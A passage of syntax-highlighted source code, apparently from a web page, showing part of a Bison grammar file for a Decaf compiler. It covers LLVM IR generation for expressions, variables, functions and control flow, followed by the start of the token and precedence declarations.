class="string">&quot;ortmp&quot;</span>);</span><br><span class="line">            Builder.CreateBr(CurBB);</span><br><span class="line"></span><br><span class="line">            Builder.SetInsertPoint(CurBB);</span><br><span class="line">            llvm::PHINode *val = Builder.CreatePHI(L-&gt;getType(), <span class="number">2</span>, <span class="string">&quot;phival&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (llvm::BasicBlock* Pred : llvm::predecessors(CurBB)) &#123;</span><br><span class="line">                BL.push_front(Pred);</span><br><span class="line">            &#125;</span><br><span class="line">            val-&gt;addIncoming(L, BL.front());</span><br><span class="line">            BL.pop_front();</span><br><span class="line">            val-&gt;addIncoming(<span class="keyword">this</span>-&gt;des.value, BL.front());</span><br><span class="line">            BL.pop_front();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = val;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_op(Option) == andtmp)&#123;</span><br><span class="line">            llvm::BasicBlock* currentBlock = Builder.GetInsertBlock(); </span><br><span class="line">            llvm::Function* currentFunction = currentBlock-&gt;getParent();</span><br><span class="line"></span><br><span class="line">            L = Exp1-&gt;Codegen();</span><br><span class="line">            llvm::BasicBlock* OpValBB = llvm::BasicBlock::Create(Context, <span class="string">&quot;noskct&quot;</span>,currentFunction);</span><br><span class="line">            llvm::BasicBlock* CurBB = llvm::BasicBlock::Create(Context, <span class="string">&quot;skctend&quot;</span>,currentFunction);</span><br><span class="line">            Builder.CreateCondBr(L,OpValBB,CurBB);</span><br><span class="line"></span><br><span class="line">            Builder.SetInsertPoint(OpValBB);</span><br><span class="line">            R = Exp2-&gt;Codegen();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = Builder.CreateAnd(L, R, <span class="string">&quot;andtmp&quot;</span>);</span><br><span class="line">            Builder.CreateBr(CurBB);</span><br><span class="line"></span><br><span class="line">            Builder.SetInsertPoint(CurBB);</span><br><span class="line">            llvm::PHINode *val = Builder.CreatePHI(L-&gt;getType(), <span class="number">2</span>, <span class="string">&quot;phival&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (llvm::BasicBlock* Pred : llvm::predecessors(CurBB)) &#123;</span><br><span class="line">                BL.push_front(Pred);</span><br><span class="line">            &#125;</span><br><span class="line">            val-&gt;addIncoming(L, BL.front());</span><br><span class="line">            BL.pop_front();</span><br><span class="line">            val-&gt;addIncoming(<span class="keyword">this</span>-&gt;des.value, BL.front());</span><br><span class="line">            BL.pop_front();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = val;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            L = Exp1-&gt;Codegen();</span><br><span class="line">            R = Exp2-&gt;Codegen();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span> || R == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">this</span>-&gt;get_op(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> addtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateAdd(L, R, <span class="string">&quot;addtmp&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> subtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSub(L, R, <span class="string">&quot;subtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> multmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateMul(L, R, <span class="string">&quot;multmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> modtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSRem(L, R, <span class="string">&quot;modtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> divtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateSDiv(L, R, <span class="string">&quot;divtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> eqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpEQ(L, R, <span class="string">&quot;eqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> neqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpNE(L, R, <span class="string">&quot;neqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> slttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLT(L, R, <span class="string">&quot;lttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> gttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGT(L, R, <span class="string">&quot;gttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> sletmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSLE(L, R, <span class="string">&quot;sletmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> geqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateICmpSGE(L, R, <span class="string">&quot;geqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> shltmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateShl(L, R, <span class="string">&quot;shltmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> lshrtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.CreateLShr(L, R, <span class="string">&quot;lshrtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;                          </span><br><span class="line">            <span class="keyword">default</span>: </span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == funcK)&#123;</span><br><span class="line">        decafFunCall * call = (decafFunCall *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = call-&gt;Codegen();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafAllexp::Codegen</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;VariableExpr&quot;</span>)&#123;</span><br><span class="line">        descriptor * des = get_symbolt(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        <span class="keyword">if</span>(des == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        &#125;</span><br><span class="line">        llvm::Value* load = Builder.CreateLoad(des-&gt;alloc,<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = load;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;NumberExpr&quot;</span>)&#123;</span><br><span class="line">        <span class="built_in">string</span> s = <span class="keyword">this</span>-&gt;get_name().substr(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        llvm::Value* arg;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;0x&quot;</span>)&#123;</span><br><span class="line">            arg = llvm::ConstantInt::get(llvm::Type::getInt32Ty(Context), <span class="built_in">std</span>::stol(<span class="keyword">this</span>-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            arg = llvm::ConstantInt::get(llvm::Type::getInt32Ty(Context), <span class="built_in">std</span>::stol(<span class="keyword">this</span>-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = arg;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;BoolExpr&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_name() == <span class="string">&quot;True&quot;</span>)&#123;</span><br><span class="line">            llvm::Type* boolType = llvm::Type::getInt1Ty(Context);</span><br><span class="line">            llvm::Constant* trueValue = llvm::ConstantInt::get(boolType, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = trueValue;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_name() == <span class="string">&quot;False&quot;</span>)&#123;</span><br><span class="line">            llvm::Type* boolType = llvm::Type::getInt1Ty(Context);</span><br><span class="line">            llvm::Constant* falseValue = llvm::ConstantInt::get(boolType, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = falseValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;get_kind() == <span class="string">&quot;StringConstant&quot;</span>)&#123;</span><br><span class="line">        llvm::GlobalVariable *GS = Builder.CreateGlobalString(<span class="keyword">this</span>-&gt;get_name() ,<span class="string">&quot;globalstring&quot;</span>);</span><br><span class="line">        llvm::Value *stringConst = Builder.CreateConstGEP2_32(GS-&gt;getValueType(), GS, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;cast&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = stringConst;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafVar::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor * des = <span class="keyword">new</span> descriptor();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Kind == <span class="string">&quot;Array&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(put_symbol(<span class="keyword">this</span>-&gt;get_name(),des))&#123;</span><br><span class="line">            llvm::ArrayType *arrayi32 = llvm::ArrayType::get(<span class="keyword">this</span>-&gt;lType, <span class="built_in">std</span>::stol(<span class="keyword">this</span>-&gt;get_arr()-&gt;get_name(),<span class="literal">NULL</span>,<span class="number">10</span>));</span><br><span class="line">            llvm::Constant *zeroInit = llvm::Constant::getNullValue(arrayi32);</span><br><span class="line">            llvm::GlobalVariable *Foo = <span class="keyword">new</span> llvm::GlobalVariable(*TheModule, arrayi32, <span class="literal">false</span>, llvm::GlobalValue::ExternalLinkage, zeroInit, <span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">            des-&gt;value = Foo;</span><br><span class="line">            des-&gt;tyg = arrayi32;</span><br><span class="line">            des-&gt;kind = arrG;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Kind == <span class="string">&quot;Scalar&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(put_symbol(<span class="keyword">this</span>-&gt;get_name(),des))&#123;</span><br><span class="line">            decafAllexp *<span class="built_in">exp</span> = <span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">            llvm::Constant *Init;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">exp</span> == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                Init = llvm::Constant::getNullValue(lType);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                Init = (llvm::Constant *)<span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            llvm::GlobalVariable *Foo = <span class="keyword">new</span> llvm::GlobalVariable(*TheModule, <span class="keyword">this</span>-&gt;lType, <span class="literal">false</span>, llvm::GlobalValue::ExternalLinkage, Init, <span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">            des-&gt;value = Foo;</span><br><span class="line">            des-&gt;kind = valueG;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(put_symbolt(<span class="keyword">this</span>-&gt;get_name(),des))&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;Alloca = Builder.CreateAlloca(<span class="keyword">this</span>-&gt;lType, <span class="number">0</span>, <span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">            llvm::Value *zero = llvm::ConstantInt::get(<span class="keyword">this</span>-&gt;lType, <span class="number">0</span>);</span><br><span class="line">            llvm::Value *val = Builder.CreateStore(zero, <span class="keyword">this</span>-&gt;Alloca);</span><br><span class="line">            des-&gt;alloc = <span class="keyword">this</span>-&gt;Alloca;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Alloca;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafEXFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafFuncDef::Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    descriptor* des = get_symbol(<span class="keyword">this</span>-&gt;get_name());</span><br><span class="line">    <span class="keyword">if</span>(check_symbol( <span class="keyword">this</span>-&gt;get_name(), funcK))&#123;</span><br><span class="line">        symbol_table s;</span><br><span class="line">        symtblt.push_front(s);</span><br><span class="line">        get_return = <span class="literal">true</span>;</span><br><span class="line">        llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;func&quot;</span>, <span class="keyword">this</span>-&gt;lfunc);</span><br><span class="line">        Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> p:<span class="keyword">this</span>-&gt;get_para()-&gt;get_para())&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i)-&gt;setName(p-&gt;get_name());</span><br><span class="line"></span><br><span class="line">            descriptor * des2 = <span class="keyword">new</span> descriptor();</span><br><span class="line">            <span class="keyword">if</span>(put_symbolt(p-&gt;get_name(),des2))&#123;</span><br><span class="line">                des2-&gt;alloc = Builder.CreateAlloca(p-&gt;lType, <span class="number">0</span>, p-&gt;get_name());</span><br><span class="line">            &#125;</span><br><span class="line">            Builder.CreateStore(<span class="keyword">this</span>-&gt;lfunc-&gt;getArg(i),des2-&gt;alloc);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        decafBlock * B = <span class="keyword">this</span>-&gt;get_block();</span><br><span class="line">        B-&gt;Codegen();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(get_return)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;lType-&gt;isVoidTy())</span><br><span class="line">                Builder.CreateRetVoid();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                Builder.CreateRet(llvm::ConstantInt::get(TheContext, llvm::APInt(<span class="number">32</span>, <span class="number">0</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        symtblt.pop_front();</span><br><span class="line">        symtblt.clear();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;lfunc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafIF::Codegen</span><span class="params">()</span></span>&#123;</span><br><span class="line">    llvm::BasicBlock* currentBlock = Builder.GetInsertBlock(); </span><br><span class="line">    llvm::Function* currentFunction = currentBlock-&gt;getParent(); </span><br><span class="line">    decafBinexp * <span class="built_in">exp</span> = (decafBinexp*)<span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    decafBlock *Block = <span class="keyword">this</span>-&gt;get_block();</span><br><span class="line">    decafBlock *Block2 = <span class="keyword">this</span>-&gt;get_block2();</span><br><span class="line"></span><br><span class="line">    llvm::BasicBlock *conditionBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;if&quot;</span>,currentFunction);</span><br><span class="line"></span><br><span class="line">    Builder.CreateBr(conditionBlock);</span><br><span class="line">    Builder.SetInsertPoint(conditionBlock);</span><br><span class="line">    llvm::Value *condition = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line"></span><br><span class="line">    llvm::BasicBlock *trueBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;true&quot;</span>,currentFunction);</span><br><span class="line">    llvm::BasicBlock *falseBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;false&quot;</span>,currentFunction);</span><br><span class="line">    llvm::BasicBlock *elseBlock = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(Block2)&#123;</span><br><span class="line">        elseBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;else&quot;</span>,currentFunction);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Block2)&#123;</span><br><span class="line">        Builder.CreateCondBr(condition, trueBlock, elseBlock);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Builder.CreateCondBr(condition, trueBlock, falseBlock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Block)&#123;</span><br><span class="line">        Builder.SetInsertPoint(trueBlock);</span><br><span class="line">        Block-&gt;Codegen();</span><br><span class="line">        Builder.CreateBr(falseBlock);</span><br><span class="line">        get_return = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Block2)&#123;</span><br><span class="line">        Builder.SetInsertPoint(elseBlock);</span><br><span class="line">        Block2-&gt;Codegen();</span><br><span class="line">        Builder.CreateBr(falseBlock);</span><br><span class="line">        get_return = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Builder.SetInsertPoint(falseBlock);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafFor::Codegen</span><span class="params">()</span></span>&#123;</span><br><span class="line">    llvm::BasicBlock* currentBlock = Builder.GetInsertBlock(); </span><br><span class="line">    llvm::Function* currentFunction = currentBlock-&gt;getParent(); </span><br><span class="line">    decafBinexp * <span class="built_in">exp</span> = (decafBinexp*)<span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    decafBlock* Block = <span class="keyword">this</span>-&gt;get_block();</span><br><span class="line">    decafAssignList *Alist = <span class="keyword">this</span>-&gt;get_list();</span><br><span class="line">    decafAssignList *Alist2 = <span class="keyword">this</span>-&gt;get_list2();</span><br><span class="line"></span><br><span class="line">    llvm::BasicBlock *conditionBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;loop&quot;</span>,currentFunction);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(Alist)&#123;</span><br><span class="line">        Alist-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    Builder.CreateBr(conditionBlock);</span><br><span class="line">    Builder.SetInsertPoint(conditionBlock);</span><br><span class="line">    llvm::Value *condition = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    llvm::BasicBlock *bodyBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;body&quot;</span>,currentFunction);</span><br><span class="line">    llvm::BasicBlock *nextBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;next&quot;</span>,currentFunction);</span><br><span class="line">    llvm::BasicBlock *endBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;end&quot;</span>,currentFunction);</span><br><span class="line"></span><br><span class="line">    Builder.CreateCondBr(condition, bodyBlock, endBlock);</span><br><span class="line"></span><br><span class="line">    Builder.SetInsertPoint(bodyBlock);</span><br><span class="line">    <span class="keyword">if</span>(Block)&#123;</span><br><span class="line">        cg.push_back(nextBlock);</span><br><span class="line">        bg.push_back(endBlock);</span><br><span class="line">        Block-&gt;Codegen();</span><br><span class="line">        cg.pop_back();</span><br><span class="line">        bg.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line">    Builder.CreateBr(nextBlock);</span><br><span class="line"></span><br><span class="line">    Builder.SetInsertPoint(nextBlock);</span><br><span class="line">    <span class="keyword">if</span>(Alist2)&#123;</span><br><span class="line">        Alist2-&gt;Codegen();</span><br><span class="line">    &#125;</span><br><span class="line">    Builder.CreateBr(conditionBlock);</span><br><span class="line"></span><br><span class="line">    Builder.SetInsertPoint(endBlock);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafWhile::Codegen</span><span class="params">()</span></span>&#123;</span><br><span class="line">    llvm::BasicBlock* currentBlock = Builder.GetInsertBlock(); </span><br><span class="line">    llvm::Function* currentFunction = currentBlock-&gt;getParent(); </span><br><span class="line">    decafBinexp * <span class="built_in">exp</span> = (decafBinexp*)<span class="keyword">this</span>-&gt;get_exp();</span><br><span class="line">    decafBlock* Block = <span class="keyword">this</span>-&gt;get_block();</span><br><span class="line"></span><br><span class="line">    llvm::BasicBlock *conditionBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;loop&quot;</span>,currentFunction);</span><br><span class="line"></span><br><span class="line">    Builder.CreateBr(conditionBlock);</span><br><span class="line">    Builder.SetInsertPoint(conditionBlock);</span><br><span class="line">    llvm::Value *condition = <span class="built_in">exp</span>-&gt;Codegen();</span><br><span class="line">    llvm::BasicBlock *bodyBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;body&quot;</span>,currentFunction);</span><br><span class="line">    llvm::BasicBlock *endBlock = llvm::BasicBlock::Create(Context, <span class="string">&quot;end&quot;</span>,currentFunction);</span><br><span class="line">    Builder.CreateCondBr(condition, bodyBlock, endBlock);</span><br><span class="line"></span><br><span class="line">    Builder.SetInsertPoint(bodyBlock);</span><br><span class="line">    <span class="keyword">if</span>(Block)&#123;</span><br><span class="line">        cg.push_back(conditionBlock);</span><br><span class="line">        bg.push_back(endBlock);</span><br><span class="line">        Block-&gt;Codegen();</span><br><span class="line">        cg.pop_back();</span><br><span class="line">        bg.pop_back();</span><br><span class="line">    &#125;</span><br><span class="line">    Builder.CreateBr(conditionBlock);</span><br><span class="line"></span><br><span class="line">    Builder.SetInsertPoint(endBlock);;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">llvm::Value *<span class="title">decafCB::Codegen</span><span class="params">()</span></span>&#123;</span><br><span class="line">    llvm::BasicBlock* currentBlock = Builder.GetInsertBlock(); </span><br><span class="line">    llvm::Function* currentFunction = currentBlock-&gt;getParent(); </span><br><span class="line"></span><br><span class="line">    llvm::BasicBlock* endBlock = <span class="literal">NULL</span>;</span><br><span class="line">    llvm::BasicBlock *loopBlock = <span class="literal">NULL</span>;</span><br><span class="line">    llvm::BasicBlock *nextBlock = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Data == <span class="string">&quot;BreakStmt&quot;</span>)&#123;</span><br><span class="line">        Builder.CreateBr(bg.back());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;Data == <span class="string">&quot;ContinueStmt&quot;</span>)&#123;</span><br><span class="line">        Builder.CreateBr(cg.back());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// we have to create a main function </span></span><br><span class="line"><span class="function">llvm::Function *<span class="title">gen_main_def</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// create the top-level definition for main</span></span><br><span class="line">    llvm::FunctionType *FT = llvm::FunctionType::get(llvm::IntegerType::get(TheContext, <span class="number">32</span>), <span class="literal">false</span>);</span><br><span class="line">    llvm::Function *TheFunction = llvm::Function::Create(FT, llvm::Function::ExternalLinkage, <span class="string">&quot;main&quot;</span>, TheModule);</span><br><span class="line">    <span class="keyword">if</span> (TheFunction == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> runtime_error(<span class="string">&quot;empty function block&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Create a new basic block which contains a sequence of LLVM instructions</span></span><br><span class="line">    llvm::BasicBlock *BB = llvm::BasicBlock::Create(TheContext, <span class="string">&quot;func&quot;</span>, TheFunction);</span><br><span class="line">    <span class="comment">// All subsequent calls to IRBuilder will place instructions in this location</span></span><br><span class="line">    Builder.SetInsertPoint(BB);</span><br><span class="line"></span><br><span class="line">    descriptor* des = <span class="keyword">new</span> descriptor();</span><br><span class="line">    des-&gt;func = TheFunction;</span><br><span class="line">    des-&gt;kind = funcK;</span><br><span class="line">    put_symbol(<span class="string">&quot;main&quot;</span>,des);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TheFunction;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE T_EXTERN T_FUNC T_SEMICOLON T_COMMA T_CONTINUE T_FALSE T_TRUE T_VAR T_FOR T_NULL T_RETURN T_WHITESPACE</span><br><span class="line">%token T_AND T_ASSIGN T_DIV T_DOT T_EQ T_RIGHTSHIFT T_GEQ T_GT T_LEFTSHIFT T_LEQ T_LT T_MINUS T_MOD T_MULT T_NEQ T_NOT T_OR T_PLUS</span><br><span class="line">%token T_VOID T_INTTYPE T_BOOLTYPE T_STRINGTYPE</span><br><span class="line">%token T_LCB T_RCB T_LPAREN T_RPAREN T_LSB T_RSB </span><br><span class="line">%token T_COMMENT</span><br><span class="line">%token T_BREAK T_ELSE T_IF T_WHILE</span><br><span class="line">%token &lt;sval&gt; T_ID T_INTCONSTANT T_CHARCONSTANT T_STRINGCONSTANT</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; state_if state_while lvalues state_for state_break state_continue state_return <span class="built_in">exp</span> assign assigns assignss method_call lvalue statements statement extern_list para_list_use para_usen para_use para_list_def block blockt var_decls var_decl method_decls method_decl decafpackage var_declp var_declps extern_def extern_defn extern_typen extern_type func_typen func_type method_type type</span><br><span class="line"></span><br><span class="line">%right T_ASSIGN </span><br><span class="line">%left T_OR</span><br><span class="line">%left T_AND</span><br><span class="line">%left T_EQ T_NEQ T_LT T_GT T_GEQ T_LEQ</span><br><span class="line">%left T_PLUS T_MINUS </span><br><span class="line">%left T_MULT T_DIV T_MOD T_RIGHTSHIFT T_LEFTSHIFT</span><br><span class="line">%right T_NOT </span><br><span class="line">%right T_UMINUS</span><br><span class="line">%right T_LPAREN</span><br><span class="line">%left T_RPAREN</span><br><span class="line">%nonassoc T_IF</span><br><span class="line">%nonassoc T_ELSE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage&#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> 